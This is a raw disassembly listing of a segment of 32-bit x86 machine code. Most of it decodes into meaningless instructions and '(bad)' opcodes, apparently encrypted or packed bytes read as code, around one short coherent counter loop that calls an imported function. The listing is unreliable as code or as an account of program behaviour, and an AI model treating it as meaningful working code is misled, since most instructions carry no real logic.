  41d7ad:	xchg   ebx,eax
  41d7ae:	adc    DWORD PTR [edi],ebx
  41d7b0:	and    DWORD PTR [edx+0xf],esi
  41d7b3:	aaa    
  41d7b4:	mov    edi,0x5f142105
  41d7b9:	push   ebp
  41d7ba:	mov    bl,0x6f
  41d7bc:	fnstsw WORD PTR [edi+0x70e0bcba]
  41d7c2:	or     cl,BYTE PTR [ebp-0x6b]
  41d7c5:	cmp    dh,BYTE PTR [eax-0x3e]
  41d7c8:	sbb    DWORD PTR [esi-0x71acc350],0xffffff97
  41d7cf:	das    
  41d7d0:	pop    ecx
  41d7d1:	iret   
  41d7d2:	mov    ecx,0x13fb9bbe
  41d7d7:	retf   
  41d7d8:	mov    eax,0xade587d7
  41d7dd:	mov    DWORD PTR [ebp+0xfc0d474],esi
  41d7e3:	dec    cl
  41d7e5:	fcomip st,st(7)
  41d7e7:	jmp    0xdd2214aa
  41d7ec:	jmp    0x91e7:0x2d9c38ae
  41d7f3:	xchg   esp,eax
  41d7f4:	rcl    WORD PTR [eax],cl
  41d7f7:	cs pop es
  41d7f9:	pop    ebp
  41d7fa:	and    bh,dh
  41d7fc:	push   esi
  41d7fd:	rcr    BYTE PTR [edi+ecx*1],1
  41d800:	fcomp  st(7)
  41d802:	xchg   esi,eax
  41d803:	cwde   
  41d804:	std    
  41d805:	pusha  
  41d806:	sub    edi,DWORD PTR [esi]
  41d808:	mov    ds:0x811c88c1,eax
  41d80d:	(bad)  
  41d80e:	sub    BYTE PTR [ecx+0x527cb99b],ch
  41d814:	fdiv   DWORD PTR [ebx]
  41d816:	mov    ebp,0x7a941e2f
  41d81b:	jnp    0x41d7fd
  41d81d:	(bad)  
  41d81e:	push   0xc
  41d820:	jne    0x41d840
  41d822:	sbb    DWORD PTR [eax],esp
  41d824:	aam    0x2
  41d826:	sti    
  41d827:	jl     0x41d7c0
  41d829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d82a:	xor    DWORD PTR [edi-0x60],edi
  41d82d:	cli    
  41d82e:	cdq    
  41d82f:	sbb    eax,0x406a64ae
  41d834:	out    0xa2,al
  41d836:	mov    esi,0xd07e0216
  41d83b:	ins    DWORD PTR es:[edi],dx
  41d83c:	pop    ecx
  41d83d:	lea    esi,[ecx]
  41d83f:	idiv   DWORD PTR [esi+0x18]
  41d842:	sub    BYTE PTR [ebx-0x60066c11],0x1
  41d849:	out    0x13,al
  41d84b:	xchg   ebx,eax
  41d84c:	sbb    DWORD PTR [edx+esi*4+0x3f],0xc8542448
  41d854:	or     al,BYTE PTR [edi+0x57]
  41d857:	fcmovu st,st(3)
  41d859:	pop    edx
  41d85a:	add    eax,0x272fd66c
  41d85f:	adc    esi,DWORD PTR [ecx+0x12bb0013]
  41d865:	std    
  41d866:	fs push cs
  41d868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d869:	in     al,0xab
  41d86b:	pop    esi
  41d86c:	mov    bl,0x8a
  41d86e:	out    dx,al
  41d86f:	iret   
  41d870:	sbb    al,0x2a
  41d872:	pusha  
  41d873:	(bad)  
  41d875:	jae    0x41d861
  41d877:	les    edx,FWORD PTR [ecx]
  41d879:	push   ss
  41d87a:	jo     0x41d8c3
  41d87c:	sbb    DWORD PTR [ebp+0x45],esi
  41d87f:	aaa    
  41d880:	jne    0x41d88b
  41d882:	rcr    DWORD PTR [esi-0x5792d308],cl
  41d888:	pusha  
  41d889:	add    esp,DWORD PTR [esi]
  41d88b:	and    DWORD PTR [edx],edi
  41d88d:	outs   dx,DWORD PTR ds:[esi]
  41d88e:	or     ebx,DWORD PTR [ecx]
  41d890:	dec    edi
  41d891:	jp     0x41d861
  41d893:	loop   0x41d8ae
  41d895:	out    dx,eax
  41d896:	out    dx,eax
  41d897:	jb     0x41d81d
  41d899:	push   esi
  41d89a:	out    dx,eax
  41d89b:	push   ebp
  41d89c:	adc    DWORD PTR [ebx],edx
  41d89e:	dec    ebx
  41d89f:	int    0xb9
  41d8a1:	sbb    bh,BYTE PTR [eax]
  41d8a3:	sbb    al,0xc1
  41d8a5:	nop
  41d8a6:	jns    0x41d8e6
  41d8a8:	(bad)  
  41d8a9:	sub    al,0xe6
  41d8ab:	add    esi,DWORD PTR [ebx+esi*4]
  41d8ae:	inc    edi
  41d8af:	pop    ds
  41d8b0:	mov    DWORD PTR [esi-0x30],ebx
  41d8b3:	stc    
  41d8b4:	ds shl esi,1
  41d8b7:	stos   BYTE PTR es:[edi],al
  41d8b8:	mov    edx,gs
  41d8ba:	div    DWORD PTR [ebx+0x3a]
  41d8bd:	xor    ch,ch
  41d8bf:	cmp    al,0x35
  41d8c1:	and    ebx,edi
  41d8c3:	test   al,0xac
  41d8c5:	jne    0x41d8d0
  41d8c7:	shr    BYTE PTR [ebx-0x60],1
  41d8ca:	pushf  
  41d8cb:	or     edi,DWORD PTR [ebx-0x4b06f222]
  41d8d1:	adc    dh,BYTE PTR [edi+0x2c]
  41d8d4:	mov    bl,0x9e
  41d8d6:	mov    WORD PTR [ecx+0x5714f43d],fs
  41d8dc:	cs cmp ecx,esi
  41d8df:	add    al,0x7f
  41d8e1:	(bad)  
  41d8e2:	pop    ecx
  41d8e3:	sub    eax,0xa52e0084
  41d8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8e9:	lods   al,BYTE PTR ds:[esi]
  41d8ea:	push   ebp
  41d8eb:	pop    ecx
  41d8ec:	ret    0x2a19
  41d8ef:	mov    cl,0x91
  41d8f1:	pop    ebp
  41d8f2:	mov    edx,0xad43682c
  41d8f7:	and    eax,DWORD PTR [edx]
  41d8f9:	clc    
  41d8fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8fb:	ins    BYTE PTR es:[edi],dx
  41d8fc:	cmp    BYTE PTR [esi],al
  41d8fe:	test   DWORD PTR [ebx-0x4d],ebp
  41d901:	pop    eax
  41d902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d903:	(bad)  
  41d904:	and    esp,DWORD PTR [ecx]
  41d906:	test   ecx,esi
  41d908:	jmp    0x230:0x1bd67a6a
  41d90f:	int    0xef
  41d911:	jns    0x41d932
  41d913:	inc    ecx
  41d914:	(bad)  
  41d915:	add    BYTE PTR [eax+0xa],bh
  41d918:	xchg   esp,eax
  41d919:	fwait
  41d91a:	pop    ss
  41d91b:	loopne 0x41d981
  41d91d:	aaa    
  41d91e:	fwait
  41d91f:	je     0x41d946
  41d921:	cmc    
  41d922:	mov    ebp,DWORD PTR [ebx-0x4152a384]
  41d928:	sub    BYTE PTR [esi+0x34f130fb],bh
  41d92e:	dec    edi
  41d92f:	mov    eax,0x99abe1be
  41d934:	ins    DWORD PTR es:[edi],dx
  41d935:	mov    eax,ds:0xf9742cc3
  41d93a:	les    ecx,FWORD PTR [ecx-0x5965d626]
  41d940:	xor    al,BYTE PTR [edi+edi*8+0x59]
  41d944:	sbb    ebp,DWORD PTR [ecx]
  41d946:	stos   DWORD PTR es:[edi],eax
  41d947:	mov    ch,0xd1
  41d949:	add    BYTE PTR [esi],dh
  41d94b:	push   esi
  41d94c:	lea    ebp,[ecx]
  41d94e:	inc    ecx
  41d94f:	push   0xccb2a477
  41d954:	sub    dh,BYTE PTR [edi]
  41d956:	aad    0x95
  41d958:	cld    
  41d959:	dec    ecx
  41d95a:	sar    DWORD PTR [ebp+0x30],0xf9
  41d95e:	hlt    
  41d95f:	push   es
  41d960:	enter  0xf303,0xe0
  41d964:	mov    DWORD PTR [edx],edx
  41d966:	push   eax
  41d967:	inc    edi
  41d968:	icebp  
  41d969:	jbe    0x41d9b6
  41d96b:	inc    esi
  41d96c:	add    eax,0x3d6e2d5b
  41d971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d972:	cmp    eax,0x66c5f879
  41d977:	mov    ecx,0x41e375d5
  41d97c:	sbb    DWORD PTR [esi],edx
  41d97e:	jns    0x41d9f7
  41d980:	mov    ebx,0x22bc0792
  41d985:	lds    ebp,FWORD PTR [eax+0x35]
  41d988:	jo     0x41d9d3
  41d98a:	cwde   
  41d98b:	gs sub dl,ch
  41d98e:	call   0xa136:0x243057bc
  41d995:	jp     0x41d97a
  41d997:	das    
  41d998:	js     0x41d9c6
  41d99a:	dec    ecx
  41d99b:	ss sub eax,eax
  41d99e:	int    0xba
  41d9a0:	dec    edx
  41d9a1:	inc    edx
  41d9a2:	scas   eax,DWORD PTR es:[edi]
  41d9a3:	fidivr DWORD PTR [ebx+0x10]
  41d9a6:	mov    eax,ds:0x2586c638
  41d9ab:	and    cl,ch
  41d9ad:	inc    eax
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	cld    
  41d9b0:	cmc    
  41d9b1:	adc    al,0xdf
  41d9b3:	jmp    0x41da2b
  41d9b5:	(bad)  
  41d9b6:	out    dx,al
  41d9b7:	ja     0x41d9fa
  41d9b9:	and    cl,dl
  41d9bb:	jns    0x41d9aa
  41d9bd:	xor    eax,0xf2b8f466
  41d9c2:	pushf  
  41d9c3:	in     eax,dx
  41d9c4:	cmc    
  41d9c5:	movq   QWORD PTR [ebx],mm2
  41d9c8:	stc    
  41d9c9:	cmp    DWORD PTR [ecx+esi*4-0x21],edi
  41d9cd:	(bad)  
  41d9ce:	jne    0x41d974
  41d9d0:	ds mov ah,0x47
  41d9d3:	adc    dl,BYTE PTR [ebp-0x4d]
  41d9d6:	xlat   BYTE PTR ds:[ebx]
  41d9d7:	jecxz  0x41d9e7
  41d9d9:	xchg   ebp,eax
  41d9da:	jmp    0x41d9ca
  41d9dc:	sub    esp,esi
  41d9de:	sub    eax,0x704ce280
  41d9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9e4:	dec    esi
  41d9e5:	xor    eax,DWORD PTR [ebx-0xf]
  41d9e8:	out    dx,eax
  41d9e9:	jbe    0x41d979
  41d9eb:	gs add bl,BYTE PTR ds:[esi]
  41d9ef:	mov    eax,0x48e8181
  41d9f4:	inc    edi
  41d9f5:	popa   
  41d9f6:	hlt    
  41d9f7:	jae    0x41da40
  41d9f9:	pop    esp
  41d9fa:	test   DWORD PTR [eax+eax*1+0x30],edx
  41d9fe:	jo     0x41d9ca
  41da00:	xor    eax,0x820de9e7
  41da05:	mov    eax,0x9e25d5eb
  41da0a:	fsub   st(6),st
  41da0c:	inc    esi
  41da0d:	xchg   ecx,eax
  41da0e:	inc    DWORD PTR [ebx+0x43]
  41da11:	jp     0x41da7c
  41da13:	xor    DWORD PTR ds:0xbdd2fb51,0x2c
  41da1a:	shl    BYTE PTR [ebp+0x35],0xf8
  41da1e:	test   DWORD PTR [ecx-0x45512764],esp
  41da24:	sbb    bh,dh
  41da26:	xchg   ebp,eax
  41da27:	push   ebx
  41da28:	add    ah,dh
  41da2a:	test   eax,0x2ebd720f
  41da2f:	mov    ds:0x2bd7e98a,ax
  41da35:	xchg   DWORD PTR [ebp+0x66ac47b],esp
  41da3b:	inc    edx
  41da3c:	test   BYTE PTR [ebp+0x49],dl
  41da3f:	mov    eax,ds:0x14a61f0a
  41da44:	xor    DWORD PTR [ebx],edi
  41da46:	push   edx
  41da47:	repz out dx,eax
  41da49:	aad    0xf3
  41da4b:	rcr    BYTE PTR [esi-0x4533dfab],cl
  41da51:	adc    dh,bh
  41da53:	stos   DWORD PTR es:[edi],eax
  41da54:	retf   0x93df
  41da57:	shl    BYTE PTR [edx-0x69c87388],1
  41da5d:	aad    0xa2
  41da5f:	inc    ebx
  41da60:	jle    0x41da7a
  41da62:	pop    ecx
  41da63:	sub    ebp,DWORD PTR [ecx+0x63c98f93]
  41da69:	sub    bl,ch
  41da6b:	ins    DWORD PTR es:[edi],dx
  41da6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da6d:	jecxz  0x41daaa
  41da6f:	sbb    DWORD PTR [ebp-0x13],eax
  41da72:	inc    edi
  41da73:	ror    DWORD PTR [ebp+0x2c1bdb5f],0xaa
  41da7a:	enter  0xdea2,0x25
  41da7e:	out    0xe3,eax
  41da80:	cmc    
  41da81:	jbe    0x41da6e
  41da83:	sbb    eax,0x7df778aa
  41da88:	cli    
  41da89:	dec    edx
  41da8a:	fstp   TBYTE PTR [ecx]
  41da8c:	add    eax,0x2067dec8
  41da91:	add    DWORD PTR [ecx+0x53],edi
  41da94:	pop    ecx
  41da95:	jae    0x41da93
  41da97:	mov    eax,0x5b82a419
  41da9c:	xor    eax,0xc0ad176c
  41daa1:	stos   DWORD PTR es:[edi],eax
  41daa2:	xor    BYTE PTR [edi-0x5b],cl
  41daa5:	inc    ebp
  41daa6:	les    ebx,FWORD PTR [ecx-0x487228dc]
  41daac:	arpl   WORD PTR [ebx+0x1d],sp
  41daaf:	sub    al,0xea
  41dab1:	shr    edi,cl
  41dab3:	cmp    eax,0x5d1ba1e5
  41dab8:	mov    cl,0x2b
  41daba:	jmp    0xd0ce9dbe
  41dabf:	push   ebp
  41dac0:	push   eax
  41dac1:	fistp  WORD PTR [ebp-0x6e]
  41dac4:	into   
  41dac5:	push   cs
  41dac6:	fwait
  41dac7:	push   edx
  41dac8:	pop    eax
  41dac9:	fnstenv [edi-0x5c]
  41dacc:	xchg   ecx,eax
  41dacd:	std    
  41dace:	adc    bh,BYTE PTR [edx-0x2214d562]
  41dad4:	mov    BYTE PTR [esi-0x1047121d],0x6c
  41dadb:	pop    eax
  41dadc:	jg     0x41db43
  41dade:	cmp    dl,BYTE PTR [esi]
  41dae0:	cld    
  41dae1:	out    0xe8,al
  41dae3:	inc    edx
  41dae4:	sbb    DWORD PTR [esi],edi
  41dae6:	and    dh,BYTE PTR [eax]
  41dae8:	fsubr  DWORD PTR [edi]
  41daea:	mov    esp,0x59299a0b
  41daef:	pop    ebx
  41daf0:	or     eax,0xea6c05ab
  41daf5:	xlat   BYTE PTR ds:[ebx]
  41daf6:	dec    eax
  41daf7:	ja     0x41da8f
  41daf9:	sub    DWORD PTR [ebx],esp
  41dafb:	inc    edx
  41dafc:	fmul   DWORD PTR [edi+edi*2+0x142835f7]
  41db03:	push   edi
  41db04:	(bad)  
  41db05:	sub    eax,0x2e6ce39a
  41db0a:	imul   esp,edx,0xe1cc6508
  41db10:	push   0xffffffd3
  41db12:	push   edx
  41db13:	mov    al,0x68
  41db15:	in     eax,dx
  41db16:	jecxz  0x41db97
  41db18:	adc    BYTE PTR [edi+0x4d],ch
  41db1b:	jo     0x41dac4
  41db1d:	dec    eax
  41db1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db1f:	test   al,0x44
  41db21:	push   ecx
  41db22:	ins    BYTE PTR es:[edi],dx
  41db23:	and    al,0x40
  41db25:	stc    
  41db26:	(bad)  
  41db27:	div    dh
  41db29:	clc    
  41db2a:	ror    DWORD PTR [ebp+0x38],cl
  41db2d:	rol    DWORD PTR [ecx],cl
  41db2f:	mov    ds,WORD PTR [ebp-0x24]
  41db32:	aad    0x58
  41db34:	les    edx,FWORD PTR [edi]
  41db36:	mov    esi,0x98364bc0
  41db3b:	mov    DWORD PTR [edx-0x6],edi
  41db3e:	addr16 loopne 0x41db3d
  41db41:	pop    ss
  41db42:	call   0x97ce:0x6737b221
  41db49:	xlat   BYTE PTR ds:[ebx]
  41db4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db4b:	push   0xffffffc6
  41db4d:	mov    ah,BYTE PTR [edi-0xd1cad41]
  41db53:	add    al,0x70
  41db55:	fidivr WORD PTR [ebp+eax*1+0x4249d759]
  41db5c:	lods   eax,DWORD PTR ds:[esi]
  41db5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db5e:	sub    dl,ah
  41db60:	sbb    esi,DWORD PTR [esi-0x75]
  41db63:	push   ebp
  41db64:	aam    0x81
  41db66:	and    eax,0x42a34d
  41db6b:	add    BYTE PTR [eax],al
  41db6d:	add    BYTE PTR [eax],al
  41db6f:	jmp    0x41db83
  41db74:	xor    ebx,ebx
  41db76:	add    ebx,DWORD PTR ds:0x42a34d
  41db7c:	inc    ebx
  41db7d:	mov    DWORD PTR ds:0x42a34d,ebx
  41db83:	cmp    DWORD PTR ds:0x42a34d,0x14
  41db8a:	jae    0x41dbbf
  41db90:	cmp    DWORD PTR ds:0x42a34d,0x16
  41db97:	jne    0x41dbac
  41db9d:	push   DWORD PTR [ebp-0x10]
  41dba0:	push   DWORD PTR [ebp-0x18]
  41dba3:	push   DWORD PTR [ebp-0x18]
  41dba6:	call   DWORD PTR ds:0x425358
  41dbac:	jmp    0x41db74
  41dbb1:	mov    edi,DWORD PTR ds:0x42a359
  41dbb7:	mov    edi,DWORD PTR [edi]
  41dbb9:	sub    DWORD PTR ds:0x42a2e1,edi
  41dbbf:	mov    edi,DWORD PTR [ebp-0x4]
  41dbc2:	jmp    0x41e0d4
  41dbc7:	retf   0xd1c8
  41dbca:	into   
  41dbcb:	(bad)  
  41dbcd:	leave  
  41dbce:	aam    0xa0
  41dbd0:	cmp    ah,dl
  41dbd2:	sbb    DWORD PTR [ebp-0xaded69d],0x73787fb1
  41dbdc:	jl     0x41dc56
  41dbde:	js     0x41db9d
  41dbe0:	mov    al,ds:0xb8c21108
  41dbe5:	mov    edx,0x143ed718
  41dbea:	jp     0x41dba4
  41dbec:	mov    ds:0x27c01a41,al
  41dbf1:	loopne 0x41dbd5
  41dbf3:	add    al,BYTE PTR [ebx]
  41dbf5:	inc    ecx
  41dbf6:	or     al,0x90
  41dbf8:	retf   
  41dbf9:	cwde   
  41dbfa:	mov    al,ds:0x9b7eeaf9
  41dbff:	shl    DWORD PTR [esi],1
  41dc01:	pop    esp
  41dc02:	fmul   QWORD PTR [ebx+0x604caf9e]
  41dc08:	sub    edx,DWORD PTR [edx+eax*2]
  41dc0b:	xchg   edx,eax
  41dc0c:	inc    edi
  41dc0d:	xchg   edi,eax
  41dc0e:	addr16 jbe 0x41dc52
  41dc11:	cmp    dl,BYTE PTR [ebx+ebx*2-0x33f0ab2f]
  41dc18:	in     al,0xe4
  41dc1a:	lds    ebx,FWORD PTR [esi-0x5d]
  41dc1d:	fs int3 
  41dc1f:	lock pop es
  41dc21:	aaa    
  41dc22:	popa   
  41dc23:	sbb    al,0x89
  41dc25:	push   edx
  41dc26:	adc    al,0xf6
  41dc28:	dec    ebx
  41dc29:	aas    
  41dc2a:	add    bh,0xd0
  41dc2d:	or     BYTE PTR [ebx],al
  41dc2f:	dec    ebp
  41dc30:	mov    ch,0x6d
  41dc32:	push   eax
  41dc33:	pop    esp
  41dc34:	or     eax,DWORD PTR [edi]
  41dc36:	nop
  41dc37:	mov    cl,0xe9
  41dc39:	and    bh,dh
  41dc3b:	shr    DWORD PTR [ecx+0x42f8b924],1
  41dc41:	jmp    0xfe17:0xcec5b824
  41dc48:	push   ebx
  41dc49:	call   0x3303:0xa4f68fff
  41dc50:	outs   dx,DWORD PTR ds:[esi]
  41dc51:	jp     0x41dc6f
  41dc53:	and    al,0x1e
  41dc55:	cmp    bh,BYTE PTR [esi]
  41dc57:	xor    BYTE PTR [ebp+0x7f514a7b],0x50
  41dc5e:	mov    ebx,0xbff612f2
  41dc63:	cdq    
  41dc64:	clc    
  41dc65:	jp     0x41dc30
  41dc67:	outs   dx,DWORD PTR ds:[esi]
  41dc68:	jmp    ebp
  41dc6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc6b:	aas    
  41dc6c:	sub    al,0xe7
  41dc6e:	add    DWORD PTR [eax],esi
  41dc70:	lahf   
  41dc71:	fst    DWORD PTR [ebx+0x62663a83]
  41dc77:	mov    ecx,0x1d8a0dc9
  41dc7c:	inc    edx
  41dc7d:	mov    ds:0x4d0de832,al
  41dc82:	into   
  41dc83:	push   eax
  41dc84:	dec    ebx
  41dc85:	mov    al,ds:0xa2bbb2f4
  41dc8a:	bound  esi,QWORD PTR [edi+0x15c8f1fb]
  41dc90:	mov    ebx,edx
  41dc92:	pand   mm4,QWORD PTR [ecx]
  41dc95:	pop    edx
  41dc96:	(bad)  
  41dc97:	jmp    0x41dcfe
  41dc99:	jmp    0x6203710b
  41dc9e:	(bad)  
  41dc9f:	mov    edi,0xd673210
  41dca4:	retf   0x1b22
  41dca7:	jae    0x41dc2d
  41dca9:	mov    ds:0xa4aace55,eax
  41dcae:	pop    ecx
  41dcaf:	xor    al,BYTE PTR [esp+edi*8+0x298c2f1a]
  41dcb6:	mov    al,0xb6
  41dcb8:	cld    
  41dcb9:	sar    esi,1
  41dcbb:	std    
  41dcbc:	adc    ch,al
  41dcbe:	jg     0x41dc6a
  41dcc0:	xchg   esi,eax
  41dcc1:	adc    edi,DWORD PTR [edx+0x9]
  41dcc4:	jne    0x41dc52
  41dcc6:	iret   
  41dcc7:	aad    0x4d
  41dcc9:	test   BYTE PTR [ebp+edx*2-0x380c1258],bh
  41dcd0:	mov    eax,ds:0x7810b61c
  41dcd5:	mov    ebx,0x981e51dd
  41dcda:	in     eax,0x9b
  41dcdc:	sbb    BYTE PTR [ebp-0x1490d57c],dh
  41dce2:	test   BYTE PTR [edx+edi*4],bh
  41dce5:	outs   dx,DWORD PTR ds:[esi]
  41dce6:	data16 in al,0x5e
  41dce9:	xchg   esi,eax
  41dcea:	xor    bh,al
  41dcec:	mov    ss,WORD PTR [edx+0x6d]
  41dcef:	loop   0x41dcd4
  41dcf1:	cmc    
  41dcf2:	sbb    al,0xad
  41dcf4:	dec    eax
  41dcf5:	xchg   DWORD PTR [esi+esi*4-0x27484cc],ebp
  41dcfc:	sbb    DWORD PTR [edi+0x1fad8972],ebx
  41dd02:	ds add eax,0x63e9f280
  41dd08:	add    al,0xa0
  41dd0a:	test   al,0x93
  41dd0c:	aas    
  41dd0d:	mov    esi,0xcb1db74c
  41dd12:	fcomp  DWORD PTR [edi+0x45711ba4]
  41dd18:	and    ch,BYTE PTR [eax]
  41dd1a:	lods   eax,DWORD PTR ds:[esi]
  41dd1b:	sbb    al,0x44
  41dd1d:	and    dl,BYTE PTR [eiz*8+0x501ef753]
  41dd24:	lds    esp,FWORD PTR [edx-0x6e]
  41dd27:	stos   BYTE PTR es:[edi],al
  41dd28:	or     cl,al
  41dd2a:	inc    edi
  41dd2b:	loope  0x41dcb3
  41dd2d:	mov    esi,0x133ffc58
  41dd32:	xor    DWORD PTR [edi+0xd473a02],edi
  41dd38:	mov    cl,0xbf
  41dd3a:	enter  0x1f12,0xae
  41dd3e:	adc    eax,0x323c718c
  41dd43:	mov    WORD PTR [esp+edx*8-0x2697dd1],fs
  41dd4a:	push   0xa8b6edd3
  41dd4f:	cmp    eax,0x878814ce
  41dd54:	sub    eax,0x19cc244
  41dd59:	jle    0x41dd3d
  41dd5b:	sub    al,0x9c
  41dd5d:	es out 0x27,al
  41dd60:	iret   
  41dd61:	mov    ch,0x84
  41dd63:	out    dx,al
  41dd64:	jecxz  0x41dd17
  41dd66:	adc    BYTE PTR [esi],bl
  41dd68:	pop    es
  41dd69:	fistp  WORD PTR [edx-0x1e]
  41dd6c:	fst    QWORD PTR [esp+edi*1+0x56]
  41dd70:	aaa    
  41dd71:	dec    BYTE PTR [ebx-0x7009cded]
  41dd77:	sub    bh,BYTE PTR [ecx+ebx*1+0x6d44b3aa]
  41dd7e:	push   0x2c
  41dd80:	inc    ebx
  41dd81:	shl    ch,0x2e
  41dd84:	add    edx,esi
  41dd86:	xlat   BYTE PTR ds:[ebx]
  41dd87:	cmp    DWORD PTR [ecx],0x14
  41dd8a:	mov    ebx,0xdf50fcdf
  41dd90:	xor    ecx,DWORD PTR [eax-0x1e9f66a3]
  41dd96:	inc    BYTE PTR [edi+0x35c75135]
  41dd9c:	pop    edi
  41dd9d:	jno    0x41ddd8
  41dd9f:	rol    edi,cl
  41dda1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dda2:	dec    ebp
  41dda3:	imul   ecx,DWORD PTR [esi],0xffffffa1
  41dda6:	fwait
  41dda7:	and    eax,0x2363d37b
  41ddac:	and    BYTE PTR [edi+0x2b643caa],0xfb
  41ddb3:	sub    eax,0x6b334cf7
  41ddb8:	cmp    al,0x21
  41ddba:	jmp    0x9b22cd2d
  41ddbf:	mov    ds:0x8de0e29c,al
  41ddc4:	or     cl,cl
  41ddc6:	addr16 mov ecx,0x9511cc15
  41ddcc:	hlt    
  41ddcd:	pop    ebp
  41ddce:	push   es
  41ddcf:	dec    ebp
  41ddd0:	(bad)  
  41ddd1:	dec    ebx
  41ddd2:	(bad)  
  41ddd4:	retf   
  41ddd5:	imul   bp,WORD PTR [eax+ebp*1],0xc439
  41dddb:	pop    esp
  41dddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dddd:	xor    al,0x6f
  41dddf:	sti    
  41dde0:	int    0x54
  41dde2:	js     0x41ddce
  41dde4:	cmp    esp,DWORD PTR [edi+0x7ce11053]
  41ddea:	or     ch,BYTE PTR [edx+0x6d174626]
  41ddf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddf1:	mov    ds:0x5e392c37,al
  41ddf6:	or     al,0x7c
  41ddf8:	cmp    BYTE PTR [eax],dh
  41ddfa:	mov    ah,0x86
  41ddfc:	shr    BYTE PTR [edx-0x5c],1
  41ddff:	addr16 mov ch,dh
  41de02:	sti    
  41de03:	cs int 0xea
  41de06:	jns    0x41de2f
  41de08:	push   ecx
  41de09:	daa    
  41de0a:	and    bh,bh
  41de0c:	shl    dl,cl
  41de0e:	and    al,0x3a
  41de10:	or     dh,BYTE PTR [edx+0x6029d15d]
  41de16:	pusha  
  41de17:	push   ebp
  41de18:	(bad)  
  41de1a:	sbb    BYTE PTR [ebx-0x3594debd],dl
  41de20:	mov    eax,ds:0x8d494909
  41de25:	adc    BYTE PTR [esi],cl
  41de27:	mov    WORD PTR [ebx+0x62],gs
  41de2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de2b:	push   0x78
  41de2d:	ins    DWORD PTR es:[edi],dx
  41de2e:	xchg   ch,bh
  41de30:	pop    edi
  41de31:	lahf   
  41de32:	push   edi
  41de33:	jmp    0x41de32
  41de35:	les    edx,FWORD PTR [edx+0x13c5e4c7]
  41de3b:	mov    dl,0x2
  41de3d:	bound  ecx,QWORD PTR [ebx+0x1f]
  41de40:	xlat   BYTE PTR ds:[ebx]
  41de41:	cmc    
  41de42:	cmc    
  41de43:	repz xor DWORD PTR [ebx],0x5c7d57f9
  41de4a:	sbb    al,0x9
  41de4c:	in     al,dx
  41de4d:	fcomip st,st(6)
  41de4f:	stos   DWORD PTR es:[edi],eax
  41de50:	add    BYTE PTR [esi+eax*1],dh
  41de53:	sbb    ah,bh
  41de55:	jl     0x41de10
  41de57:	mov    eax,ds:0x895df226
  41de5c:	sar    DWORD PTR [edi],0x99
  41de5f:	pop    esi
  41de60:	outs   dx,DWORD PTR ds:[esi]
  41de61:	inc    esi
  41de62:	mov    edx,0x914d152c
  41de67:	addr16 daa 
  41de69:	and    edi,0xe4f15859
  41de6f:	dec    esp
  41de70:	cmp    al,0x15
  41de72:	aam    0x4
  41de74:	ds mov ebx,0x85f31ee5
  41de7a:	aam    0x34
  41de7c:	out    dx,al
  41de7d:	ret    
  41de7e:	dec    edi
  41de7f:	test   DWORD PTR [ebp+0x6b7d8e28],0x62d575c0
  41de89:	nop
  41de8a:	sbb    BYTE PTR [edi+0x4d3cbb61],cl
  41de90:	scas   eax,DWORD PTR es:[edi]
  41de91:	test   al,0x2e
  41de93:	lods   al,BYTE PTR ds:[esi]
  41de94:	mov    bh,0x3c
  41de96:	pop    edx
  41de97:	fld    TBYTE PTR [esp+ebp*1]
  41de9a:	imul   eax,eax,0x1345a8f4
  41dea0:	ret    0x2468
  41dea3:	xlat   BYTE PTR ds:[ebx]
  41dea4:	add    ecx,esp
  41dea6:	add    cl,bl
  41dea8:	or     al,0x3b
  41deaa:	mov    ecx,0x8902fb1e
  41deaf:	jb     0x41de7a
  41deb1:	sahf   
  41deb2:	push   0xffffffaa
  41deb4:	out    dx,al
  41deb5:	dec    esp
  41deb6:	pop    eax
  41deb7:	jb     0x41de9f
  41deb9:	lods   eax,DWORD PTR ds:[esi]
  41deba:	and    cl,BYTE PTR [esi-0x7f]
  41debd:	les    edx,FWORD PTR [ebx+0x78e001f6]
  41dec3:	ins    BYTE PTR es:[edi],dx
  41dec4:	ins    DWORD PTR es:[edi],dx
  41dec5:	xor    esi,esi
  41dec7:	mov    ecx,0x5a7be07
  41decc:	cmp    BYTE PTR [esp+eax*8],cl
  41decf:	xchg   ebx,eax
  41ded0:	cwde   
  41ded1:	inc    esi
  41ded2:	mov    BYTE PTR [esi],bl
  41ded4:	lods   eax,DWORD PTR ds:[esi]
  41ded5:	xchg   ebp,eax
  41ded6:	outs   dx,DWORD PTR ds:[esi]
  41ded7:	(bad)  
  41ded8:	jmp    DWORD PTR [ebx+eiz*2+0x70a9b979]
  41dedf:	clc    
  41dee0:	sbb    BYTE PTR [esp+ecx*2],dh
  41dee3:	frstor [ecx]
  41dee5:	pop    ecx
  41dee6:	dec    dh
  41dee8:	jns    0x41de6c
  41deea:	push   0xa
  41deec:	hlt    
  41deed:	scas   al,BYTE PTR es:[edi]
  41deee:	idiv   BYTE PTR [edi+0x68]
  41def1:	mov    dh,0xb6
  41def3:	(bad)  
  41def4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41def5:	adc    WORD PTR [eax],bx
  41def8:	push   edx
  41def9:	shl    BYTE PTR [edi-0x33484f49],0x6d
  41df00:	test   al,0x9c
  41df02:	cmc    
  41df03:	xor    edx,DWORD PTR [ebx+0x35]
  41df06:	retf   0x798f
  41df09:	inc    eax
  41df0a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
